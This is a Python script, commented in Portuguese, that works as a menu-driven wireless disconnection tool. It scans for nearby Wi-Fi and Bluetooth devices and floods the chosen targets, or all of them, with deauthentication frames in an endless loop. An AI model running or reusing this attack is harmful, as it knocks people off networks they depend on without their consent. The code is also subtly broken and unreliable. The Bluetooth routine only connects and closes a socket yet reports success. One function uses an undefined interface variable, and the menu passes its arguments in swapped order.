import time
import bluetooth
from scapy.all import *

# Função para realizar o flood de desconexão (deauth) em um dispositivo Wi-Fi
def flood_deauth_wifi(target_mac, iface):
    # Cria um pacote de deauth usando o endereço MAC de destino e a interface de rede
    packet = RadioTap() / Dot11(type=0, subtype=12, addr1=target_mac) / Dot11Deauth()

    # Envia o pacote continuamente
    while True:
        try:
            sendp(packet, iface=iface, verbose=False)
        except KeyboardInterrupt:
            print("Flood de desconexão interrompido.")
            break

# Função para realizar o flood de desconexão (deauth) em um dispositivo Bluetooth
def flood_deauth_bluetooth(target_mac):
    try:
        sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
        sock.connect((target_mac, 1))
        sock.close()
        print(f"Dispositivo {target_mac} desconectado com sucesso.")
    except Exception as e:
        print(f"Erro ao desconectar dispositivo {target_mac}: {str(e)}")

# Função para obter dispositivos Wi-Fi próximos
def obter_dispositivos_wifi():
    dispositivos = {}
    sniffed = sniff(count=10, iface=iface, timeout=5, prn=lambda x: x.summary())
    for pkt in sniffed:
        if pkt.haslayer(Dot11):
            if pkt.type == 0 and pkt.subtype == 8:
                if pkt.addr2 not in dispositivos:
                    dispositivos[pkt.addr2] = pkt.info.decode()
    return dispositivos

# Função para obter dispositivos Bluetooth próximos
def obter_dispositivos_bluetooth():
    dispositivos = {}
    nearby_devices = bluetooth.discover_devices()
    for device_address in nearby_devices:
        device_name = bluetooth.lookup_name(device_address)
        dispositivos[device_address] = device_name
    return dispositivos

# Função para exibir os dispositivos e solicitar a escolha do usuário
def escolher_dispositivo(dispositivos):
    print("Dispositivos encontrados:")
    for i, (mac, nome) in enumerate(dispositivos.items(), start=1):
        print(f"{i}. {nome} ({mac})")
    opcao = input("Escolha o número do dispositivo ou digite 'todos' para selecionar todos os dispositivos: ")
    if opcao.isdigit():
        opcao = int(opcao)
        if opcao >= 1 and opcao <= len(dispositivos):
            target_mac = list(dispositivos.keys())[opcao - 1]
            return [target_mac]
    elif opcao.lower() == "todos":
        return list(dispositivos.keys())
    return []

# Função para realizar o flood de desconexão com base na escolha do usuário
def executar_flood(opcao_dispositivos, opcao_flood, iface):
    dispositivos_wifi = obter_dispositivos_wifi()
    dispositivos_bluetooth = obter_dispositivos_bluetooth()

    if opcao_dispositivos == "1" and len(dispositivos_wifi) > 0:
        dispositivos_escolhidos = escolher_dispositivo(dispositivos_wifi)
        if len(dispositivos_escolhidos) > 0:
            for target_mac in dispositivos_escolhidos:
                print(f"Iniciando o flood de desconexão Wi-Fi para o dispositivo com o endereço MAC {target_mac}...")
                print("Pressione Ctrl+C para interromper o flood.")
                flood_deauth_wifi(target_mac, iface)
    elif opcao_dispositivos == "2" and len(dispositivos_bluetooth) > 0:
        dispositivos_escolhidos = escolher_dispositivo(dispositivos_bluetooth)
        if len(dispositivos_escolhidos) > 0:
            for target_mac in dispositivos_escolhidos:
                print(f"Iniciando o flood de desconexão Bluetooth para o dispositivo com o endereço MAC {target_mac}...")
                print("Pressione Ctrl+C para interromper o flood.")
                flood_deauth_bluetooth(target_mac)
    elif opcao_dispositivos == "3" and len(dispositivos_wifi) > 0 and len(dispositivos_bluetooth) > 0:
        dispositivos_escolhidos_wifi = escolher_dispositivo(dispositivos_wifi)
        dispositivos_escolhidos_bluetooth = escolher_dispositivo(dispositivos_bluetooth)
        if len(dispositivos_escolhidos_wifi) > 0:
            for target_mac in dispositivos_escolhidos_wifi:
                print(f"Iniciando o flood de desconexão Wi-Fi para o dispositivo com o endereço MAC {target_mac}...")
                print("Pressione Ctrl+C para interromper o flood.")
                flood_deauth_wifi(target_mac, iface)
        if len(dispositivos_escolhidos_bluetooth) > 0:
            for target_mac in dispositivos_escolhidos_bluetooth:
                print(f"Iniciando o flood de desconexão Bluetooth para o dispositivo com o endereço MAC {target_mac}...")
                print("Pressione Ctrl+C para interromper o flood.")
                flood_deauth_bluetooth(target_mac)
    else:
        print("Não há dispositivos disponíveis para realizar o flood de desconexão.")

# Função para exibir o menu principal
def exibir_menu():
    while True:
        print("----- Menu de Flood de Desconexão -----")
        print("1. Flood de Desconexão Wi-Fi")
        print("2. Flood de Desconexão Bluetooth")
        print("3. Flood de Desconexão Wi-Fi e Bluetooth")
        print("0. Sair")

        opcao = input("Escolha uma opção: ")

        if opcao == "1" or opcao == "2" or opcao == "3":
            opcao_dispositivos = input("Deseja selecionar dispositivos específicos ou todos ao redor? (1 - Específicos, 2 - Todos): ")
            if opcao_dispositivos == "1" or opcao_dispositivos == "2":
                iface = input("Digite o nome da interface de rede: ")
                executar_flood(opcao_dispositivos, opcao, iface)
            else:
                print("Opção inválida. Por favor, escolha uma opção válida.")
        elif opcao == "0":
            break
        else:
            print("Opção inválida. Por favor, escolha uma opção válida.")

# Executa o programa
exibir_menu()
